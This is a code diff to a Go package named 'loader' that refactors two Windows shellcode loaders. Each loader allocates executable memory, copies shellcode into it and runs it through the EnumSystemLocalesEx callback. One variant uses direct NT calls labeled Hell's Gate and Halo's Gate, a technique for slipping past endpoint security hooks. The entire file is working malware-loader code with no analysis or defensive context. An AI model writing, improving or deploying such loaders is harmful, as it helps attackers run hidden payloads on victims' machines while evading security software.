@@ -1,79 +1,92 @@
 package loader
 
 import (
+	"fmt"
 	"unsafe"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
-func EnumSystemLocales(shellcode []byte) error {
-	addr, _, err := wdll.VirtualAlloc().Call(
+func EnumSystemLocalesExX(shellcode []byte) error {
+	addr, vaErr := xwindows.VirtualAlloc(
 		0,
 		uintptr(len(shellcode)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE,
 	)
-
 	if addr == 0 {
-		return err
+		return fmt.Errorf("VirtualAlloc failed: %w", vaErr)
 	}
 
-	wdll.RtlMoveMemory().Call(
-		addr,
-		(uintptr)(unsafe.Pointer(&shellcode[0])),
+	rmErr := xwindows.RtlMoveMemory(
+		unsafe.Pointer(addr),
+		unsafe.Pointer(&shellcode[0]),
 		uintptr(len(shellcode)),
 	)
+	if rmErr != nil {
+		return fmt.Errorf("RtlMoveMemory failed: %w", rmErr)
+	}
 
-	wdll.EnumSystemLocalesEx().Call(
+	_, enumErr := xwindows.EnumSystemLocalesEx(
 		addr,
 		0,
 		0,
 		0,
 	)
+	if enumErr != nil {
+		return fmt.Errorf("EnumSystemLocalesEx failed: %w", enumErr)
+	}
 
 	return nil
 }
 
 /*
-
+EnumSystemLocalesHalos
 Hell's Gate + Halo's Gate technique
-
 */
-
 func EnumSystemLocalesHalos(shellcode []byte) error {
-	pHandle, _, _ := wdll.GetCurrentProcess().Call()
+	pHandle, gcpErr := xwindows.GetCurrentProcess()
+	if gcpErr != nil {
+		return fmt.Errorf("GetCurrentProcess failed: %w", gcpErr)
+	}
 
 	var addr uintptr
 	regionsize := uintptr(len(shellcode))
 
-	r1, _, err := wdll.NtAllocateVirtualMemory().Call(
+	r1, ntAllocErr := xwindows.NtAllocateVirtualMemory(
 		pHandle,
-		uintptr(unsafe.Pointer(&addr)),
+		(*byte)(unsafe.Pointer(&addr)),
 		0,
 		uintptr(unsafe.Pointer(&regionsize)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE,
 	)
-
 	if r1 != 0 {
-		return err
+		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", ntAllocErr)
 	}
 
-	wdll.NtWriteVirtualMemory().Call(
+	var numberOfBytesWritten uintptr
+	r2, ntWriteErr := xwindows.NtWriteVirtualMemory(
 		pHandle,
-		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		(*byte)(unsafe.Pointer(addr)),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		0,
+		&numberOfBytesWritten,
 	)
+	if r2 != 0 {
+		return fmt.Errorf("NtWriteVirtualMemory failed: %w", ntWriteErr)
+	}
 
-	wdll.EnumSystemLocalesEx().Call(
+	_, enumSystemErr := xwindows.EnumSystemLocalesEx(
 		addr,
 		0,
 		0,
 		0,
 	)
+	if enumSystemErr != nil {
+		return fmt.Errorf("EnumSystemLocalesEx failed: %w", enumSystemErr)
+	}
 
 	return nil
 }
